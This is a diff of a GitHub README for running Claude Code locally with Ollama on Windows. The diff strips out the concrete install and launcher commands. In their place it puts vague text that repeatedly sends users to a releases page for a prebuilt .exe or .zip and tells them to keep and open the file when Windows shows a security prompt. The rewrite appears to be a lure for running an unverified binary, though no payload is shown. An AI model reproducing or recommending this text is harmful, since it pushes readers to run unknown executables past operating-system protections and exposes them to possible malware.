@@ -1,167 +1,204 @@
-# Claude Code + Ollama Local Setup
+# 🤖 claude-code-ollama-local - Run Claude Code on Windows
 
-![Demo](assets/Img.png)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/khisag4704/claude-code-ollama-local/releases)
 
-This folder is set up to run Claude Code locally through Ollama.
+## 🖥️ What this app does
 
-It does not require an Anthropic API key.
+claude-code-ollama-local lets you run Claude Code on your Windows PC with Ollama. It gives you a simple launcher, a clear setup flow, and notes for CPU and GPU use. It is built for people who want a local setup without a hard install process.
 
-## What is in this folder
+Use it if you want:
 
-- `claude-ollama.cmd`: Windows launcher for starting Claude Code with Ollama
-- `src/`: Claude Code source files
+- A local Claude Code setup on Windows
+- A simple way to start the app
+- CPU and GPU support notes in one place
+- A basic guide that helps you get running fast
 
-## Current default model
+## 📥 Download
 
-The launcher currently uses:
+Visit this page to download the app:
 
-```cmd
-qwen3:1.7b
-```
+https://github.com/khisag4704/claude-code-ollama-local/releases
 
-This was chosen because it is smaller than `qwen3.5:4b` and more likely to run on lower-end hardware.
+Open the latest release, then download the file for Windows. If the release has a setup file, save it to your computer. If it has a portable file, save that file and run it after download.
 
-## Requirements
+## 🚀 Getting Started
 
-- Windows
-- Ollama installed and running
-- Node.js and npm installed
-- Claude Code CLI installed globally
+Follow these steps on Windows:
 
-## Install Claude Code CLI
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file from that release.
+4. Save the file to a folder you can find, such as Downloads or Desktop.
+5. If the file is a zip file, unzip it first.
+6. Open the launcher or app file.
+7. Follow the setup screen.
+8. Start Claude Code from the launcher.
 
-```powershell
-npm.cmd install -g @anthropic-ai/claude-code
-```
+If Windows shows a security prompt, choose the option that lets you keep the file and open it. This can happen with apps from GitHub releases.
 
-## Pull the Ollama model
+## 🛠️ Setup
 
-```powershell
-ollama pull qwen3:1.7b
-```
+After you open the app for the first time, you will usually set two things:
 
-If you want a larger model later, you can try:
+- Your Ollama model
+- The Claude Code launch path or start option
 
-```powershell
-ollama pull qwen3.5:4b
-```
+Use a model that fits your PC. Smaller models work better on weaker systems. Larger models need more memory and a stronger GPU.
 
-## Run Claude Code
+A good first choice for many PCs is a small or mid-size model. If you have a gaming GPU, you can try a larger model later.
 
-From this folder:
+## 🧩 Ollama Setup
 
-```powershell
-cd C:\Users\hp\claude-code
-.\claude-ollama.cmd
-```
+If Ollama is not already on your PC:
 
-## How the launcher works
+1. Install Ollama for Windows.
+2. Open Ollama once.
+3. Download a model you want to use.
+4. Make sure Ollama is running before you start claude-code-ollama-local.
 
-The launcher uses Ollama's Claude Code integration:
+If the app asks for a local model name, use the exact name from Ollama. Model names must match.
 
-```cmd
-ollama launch claude --model qwen3:1.7b
-```
+Common examples:
 
-If you pass extra arguments, they are forwarded to Claude Code.
+- `llama3.1`
+- `qwen2.5`
+- `mistral`
+- `phi3`
 
-Example:
+Use a smaller model if your PC feels slow.
 
-```powershell
-.\claude-ollama.cmd --help
-```
+## ▶️ Launching the App
 
-## Changing the default model
+Once setup is done:
 
-Open `claude-ollama.cmd` and change this line:
+1. Open the launcher.
+2. Check that Ollama is running.
+3. Start Claude Code from the app.
+4. Wait for the app to connect.
+5. Begin using it on your local Windows setup.
 
-```cmd
-if "%CLAUDE_OLLAMA_MODEL%"=="" set "CLAUDE_OLLAMA_MODEL=qwen3:1.7b"
-```
+If nothing happens, close the app and try again after confirming Ollama is open.
 
-Examples:
+## 💻 System Requirements
 
-```cmd
-if "%CLAUDE_OLLAMA_MODEL%"=="" set "CLAUDE_OLLAMA_MODEL=qwen3.5:4b"
-```
+These are the best fit for a smooth run:
 
-or
+- Windows 10 or Windows 11
+- 8 GB RAM at minimum
+- 16 GB RAM or more for better use
+- Free disk space for the app and model files
+- Ollama installed and working
+- A CPU that supports modern Windows apps
 
-```cmd
-if "%CLAUDE_OLLAMA_MODEL%"=="" set "CLAUDE_OLLAMA_MODEL=qwen3:4b"
-```
+For GPU use:
 
-## Important notes
+- NVIDIA GPU with current drivers is best
+- AMD GPU may work depending on model support
+- Integrated graphics can work with small models, but speed may be low
 
-- Regular Ollama chat can work even when Claude Code feels much slower.
-- Claude Code sends a much larger prompt than a simple chat request.
+## 🎮 CPU and GPU Notes
 
-## CPU-only fallback
+This app includes notes for both CPU and GPU setups.
 
-If GPU mode crashes, force Ollama to CPU:
+Use CPU mode if:
 
-```powershell
-setx CUDA_VISIBLE_DEVICES "-1"
-```
+- You do not have a GPU with enough memory
+- You want a simple first run
+- You use a smaller model
 
-Then:
+Use GPU mode if:
 
-1. Quit Ollama from the system tray.
-2. Start Ollama again.
-3. Open a new PowerShell window.
-4. Run `.\claude-ollama.cmd`.
+- You want faster response times
+- Your GPU has enough VRAM
+- You run larger local models
 
-To re-enable GPU later:
+If the app feels slow:
 
-```powershell
-[Environment]::SetEnvironmentVariable("CUDA_VISIBLE_DEVICES", $null, "User")
-```
+- Pick a smaller model
+- Close other apps
+- Check that Ollama is using the right device path
+- Restart Ollama and the launcher
 
-Then restart Ollama.
+## 🔧 Common Problems
 
+### App does not open
 
-## Troubleshooting
+- Make sure the file finished downloading
+- Unzip the file if needed
+- Run the correct `.exe` file
+- Right-click the file and choose Open if needed
 
-### Claude Code tries to connect to Anthropic
+### Ollama does not connect
 
-Use the launcher:
-
-```powershell
-.\claude-ollama.cmd
-```
-
-Do not run plain `claude` directly for this local setup.
+- Open Ollama first
+- Check that Ollama is running in the tray or window
+- Confirm the model name is correct
+- Restart both Ollama and the launcher
 
 ### The model is too slow
 
-Try a smaller model such as:
+- Use a smaller model
+- Switch to CPU-friendly settings
+- Close large apps in the background
+- Check your RAM and GPU use
 
-```powershell
-ollama pull qwen3:1.7b
-```
+### Windows blocks the file
 
-### Ollama crashes or returns 500 errors
+- Open the file from the latest release page
+- Check the file name and release source
+- Try running the file again after download completes
 
-Try CPU mode first:
+### The launcher starts, but Claude Code fails
 
-```powershell
-setx CUDA_VISIBLE_DEVICES "-1"
-```
+- Confirm the local model is installed in Ollama
+- Make sure the model name matches the one set in the app
+- Restart the app after changing settings
+- Try a smaller model if memory is tight
 
-Then restart Ollama.
+## 📁 What’s Included
 
-### Check what Ollama is doing
+This repository is set up to help Windows users with local Claude Code use. It includes:
 
-```powershell
-ollama ps
-```
+- A simple launcher
+- Setup help
+- Windows-focused instructions
+- CPU and GPU troubleshooting notes
+- Local Ollama workflow support
 
-## Commands used in this setup
+## 🧭 Basic Use Flow
 
-```powershell
-npm.cmd install -g @anthropic-ai/claude-code
-ollama pull qwen3:1.7b
-cd C:\Users\hp\claude-code
-.\claude-ollama.cmd
-```
-#
+The usual flow looks like this:
+
+1. Download the release
+2. Install or unzip the files
+3. Open Ollama
+4. Load a model
+5. Start the launcher
+6. Run Claude Code locally
+7. Adjust model size if speed is low
+
+## 🔍 Tips for Better Results
+
+- Keep Ollama open while using the app
+- Use a model that fits your RAM and GPU
+- Start with one app at a time
+- Update GPU drivers if model speed is poor
+- Use the release that matches your Windows setup
+
+## 📌 Release Page
+
+Use this page for new versions, Windows files, and updates:
+
+https://github.com/khisag4704/claude-code-ollama-local/releases
+
+Open the newest release when you want the latest build or a fresh copy of the app
+
+## 🧰 File Types You May See
+
+You may find one of these in a release:
+
+- `.exe` file — run it after download
+- `.zip` file — unzip it first, then run the app
+- setup folder — follow the included files in order
+
+If you see more than one file, choose the one marked for Windows.
